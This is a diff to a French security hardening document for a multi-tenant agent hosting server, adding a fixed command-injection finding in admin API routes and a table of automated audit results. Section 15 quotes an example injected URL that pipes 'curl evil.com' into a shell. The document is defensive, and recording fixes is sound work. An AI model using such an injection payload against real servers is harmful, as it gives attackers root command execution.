@@ -322,3 +322,33 @@ ls -la /opt/otto/clients/{id}/data/sessions/main/.claude/
 find /opt/otto/clients/{id}/ -perm -o=r -not -path "*/node_modules/*" 2>/dev/null
 # Attendu : aucun résultat
 ```
+
+---
+
+## 15. Injection de commande dans l'API admin
+
+**Symptôme** : les routes `/api/admin/clients/:id/restart` et `/api/admin/clients/:id/stop` interpolent `req.params.id` directement dans `execSync()` sans validation.
+
+**Risque** : un attaquant connaissant le token admin peut injecter des commandes shell arbitraires via l'URL (ex: `POST /api/admin/clients/foo;curl evil.com|sh/restart` → exécution de commandes en root sur le serveur).
+
+**Fix appliqué** : validation de tous les paramètres `:id` via `app.param('id', validateClientId)` dans `api/src/admin.ts`. Le pattern `/^[a-z0-9-]+$/` rejette tout caractère spécial avant que l'ID n'atteigne `execSync` ou `path.join`.
+
+**Portée** : la validation couvre TOUTES les routes admin utilisant `:id` (restart, stop, db, query, memory), pas seulement les deux routes vulnérables. C'est une défense en profondeur.
+
+**Priorité** : CRITIQUE — corrigé.
+
+---
+
+## 16. Audit de sécurité automatisé
+
+Un audit automatisé (`/security-review`) a été exécuté le 29/03/2026. Résultats :
+
+| # | Finding | Sévérité | Confiance | Statut |
+|---|---------|----------|-----------|--------|
+| 1 | Injection commande admin API (`req.params.id` → `execSync`) | HIGH | 8/10 | Corrigé (validation `app.param`) |
+| 2 | Injection commande `clientId` (provision/onboard) | — | 2/10 | Faux positif (`slugify()` sanitise) |
+| 3 | Traversée de chemin admin memory | — | 4/10 | Faux positif (Express bloque `/` dans `:id`) |
+| 4 | `chmod 777` dans onboard.ts | MEDIUM | 5/10 | Corrigé (aligné sur provision.ts) |
+| 5 | Bypass symlink hook PreToolUse | — | 2/10 | Faux positif (Docker isole le filesystem) |
+
+**Recommandation** : exécuter `/security-review` après chaque lot de modifications touchant l'API, le provisioning, ou les permissions.
